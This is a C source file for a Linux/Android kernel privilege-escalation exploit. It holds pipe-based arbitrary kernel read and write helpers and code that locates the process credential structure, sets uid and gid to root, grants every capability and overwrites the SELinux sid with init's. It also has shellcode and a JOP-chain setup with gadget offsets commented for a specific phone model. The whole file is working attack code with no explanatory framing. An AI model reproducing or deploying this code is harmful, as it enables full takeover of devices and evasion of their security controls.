#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <inttypes.h>

#include "threadinfo.h"
#include "sid.h"

#define __user
#define __kernel

#define QUOTE(str) #str
#define TOSTR(str) QUOTE(str)
#define ASMMAGIC (0xBEEFDEAD)

int read_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes))
		return 1;

	if(write(pipes[1], address, len) != len)
		goto end;
	if(read(pipes[0], buf, len) != len)
		goto end;

	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

int write_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes))
		return 1;

	if(write(pipes[1], buf, len) != len)
		goto end;
	if(read(pipes[0], address, len) != len)
		goto end;

	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

inline int writel_at_address_pipe(void* address, unsigned long val)
{
	return write_at_address_pipe(address, &val, sizeof(val));
}

int modify_task_cred_uc(struct thread_info* __kernel info)
{
	unsigned int i;
	unsigned long val;
	struct cred* __kernel cred = NULL;
	struct thread_info ti;
	struct task_security_struct* __kernel security = NULL;
	struct task_struct_partial* __user tsp;

	if(read_at_address_pipe(info, &ti, sizeof(ti)))
		return 1;

	tsp = malloc(sizeof(*tsp));
	for(i = 0; i < 0x600; i+= sizeof(void*))
	{
		struct task_struct_partial* __kernel t = (struct task_struct_partial*)((void*)ti.task + i);
		if(read_at_address_pipe(t, tsp, sizeof(*tsp)))
			break;

		if (is_cpu_timer_valid(&tsp->cpu_timers[0])
			&& is_cpu_timer_valid(&tsp->cpu_timers[1])
			&& is_cpu_timer_valid(&tsp->cpu_timers[2])
			&& tsp->real_cred == tsp->cred)
		{
			cred = tsp->cred;
			break;
		}
	}

	free(tsp);
	if(cred == NULL)
		return 1;

	val = 0;
	write_at_address_pipe(&cred->uid, &val, sizeof(cred->uid));
	write_at_address_pipe(&cred->gid, &val, sizeof(cred->gid));
	write_at_address_pipe(&cred->suid, &val, sizeof(cred->suid));
	write_at_address_pipe(&cred->sgid, &val, sizeof(cred->sgid));
	write_at_address_pipe(&cred->euid, &val, sizeof(cred->euid));
	write_at_address_pipe(&cred->egid, &val, sizeof(cred->egid));
	write_at_address_pipe(&cred->fsuid, &val, sizeof(cred->fsuid));
	write_at_address_pipe(&cred->fsgid, &val, sizeof(cred->fsgid));

	val = -1;
	write_at_address_pipe(&cred->cap_inheritable.cap[0], &val, sizeof(cred->cap_inheritable.cap[0]));
	write_at_address_pipe(&cred->cap_inheritable.cap[1], &val, sizeof(cred->cap_inheritable.cap[1]));
	write_at_address_pipe(&cred->cap_permitted.cap[0], &val, sizeof(cred->cap_permitted.cap[0]));
	write_at_address_pipe(&cred->cap_permitted.cap[1], &val, sizeof(cred->cap_permitted.cap[1]));
	write_at_address_pipe(&cred->cap_effective.cap[0], &val, sizeof(cred->cap_effective.cap[0]));
	write_at_address_pipe(&cred->cap_effective.cap[1], &val, sizeof(cred->cap_effective.cap[1]));
	write_at_address_pipe(&cred->cap_bset.cap[0], &val, sizeof(cred->cap_bset.cap[0]));
	write_at_address_pipe(&cred->cap_bset.cap[1], &val, sizeof(cred->cap_bset.cap[1]));

	read_at_address_pipe(&cred->security, &security, sizeof(security));
	if ((unsigned long)security > KERNEL_START) 
	{
		struct task_security_struct tss;
		if(read_at_address_pipe(security, &tss, sizeof(tss)))
			goto end;

		if (tss.osid != 0
			&& tss.sid != 0
			&& tss.exec_sid == 0
			&& tss.create_sid == 0
			&& tss.keycreate_sid == 0
			&& tss.sockcreate_sid == 0)
		{
			unsigned int sid = get_sid("init");
			if(sid)
			{
				write_at_address_pipe(&security->osid, &sid, sizeof(security->osid));
				write_at_address_pipe(&security->sid, &sid, sizeof(security->sid));
			}
		}
	}

end:
	return 0;
}

#if !(__LP64__)
__attribute__ ((naked)) static void wrapper()
{
	asm volatile(
		"ldr PC, ="TOSTR(ASMMAGIC)
	);
}

static struct thread_info* exploit()
{
	struct thread_info* ti = current_thread_info();
	ti->addr_limit = -1;
	return ti;
}

void copyshellcode(void** addr)
{
	unsigned int i;
	memcpy(addr, wrapper, 0x100);

	for(i = 0; i < (0x100 / sizeof(void*)); i++)
	{
		if(addr[i] == (void*)ASMMAGIC)
		{
			addr[i] = &exploit;
			break;
		}
	}
}

#else

void preparejop(void** addr, void* jopret)
{
	unsigned int i;
	for(i = 0; i < (0x1000 / sizeof(int)); i++)
		((int*)addr)[i] = 0xDEAD;

/*
load frame pointer into x0, x0 is mmap address
LOAD:FFFFFFC0003C66E0                 LDR             X1, [X0,#0x210]
LOAD:FFFFFFC0003C66E4                 CBZ             X1, loc_FFFFFFC0003C66F0
LOAD:FFFFFFC0003C66E8                 ADD             X0, X29, #0x78
LOAD:FFFFFFC0003C66EC                 BLR             X1
*/
	addr[66] = jopret; //[X0, #0x210]

/* Xperia M5
.text:FFFFFFC0001E06FC                 LDR             X1, [X0,#8]
.text:FFFFFFC0001E0700                 CBZ             X1, loc_FFFFFFC0001E070C
.text:FFFFFFC0001E0704                 ADD             X0, X29, #0x10
.text:FFFFFFC0001E0708                 BLR             X1
*/
	addr[1] = jopret; //[X0,#8]
}

#endif
